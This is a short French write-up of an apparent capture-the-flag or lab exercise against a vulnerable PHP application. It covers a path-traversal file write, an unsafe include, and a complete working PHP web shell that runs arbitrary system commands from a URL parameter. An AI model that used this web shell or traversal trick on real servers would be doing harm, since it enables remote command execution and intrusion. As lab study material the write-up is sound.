# Level 1:
résolu en mettant **index.php** dans le champ du form. le hash **5f4dcc3b5aa765d61d8327deb882cf99** correspond à **password**

# Level 2:

## vuln:

```python
file_put_contents("/tmp/" . $file_name . ".txt", $_POST['file_content']);
```
**l'entrée utilisateur n'est pas échapée ici et nous permet donc de manipuler le chemin de base.**
Le but est de faire uploader un **webshell.txt** via cette vul et le mettre dans **/tmp/../var/www/html/documents/webshell**.
Afin de pouvoir y acceder plus tard au **level-3** via le formulaire qui ne lis que les fichiers dans **./documents**

# Level 3:

## vuln:

```python
include($file_path);
```
un include lis le fcihier et essaie de l'éxecuter, quel que soit l'extension du fichier. même les .txt.
Ceci exécutera donc le code php se trouvant dans webshell.txt uploadé précedemment dans **level-2**.

## exploit:
```python
avec ce code dans webshell.txt :
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

On arrive à faire executer un web shell en demandant à voir ce fichier.
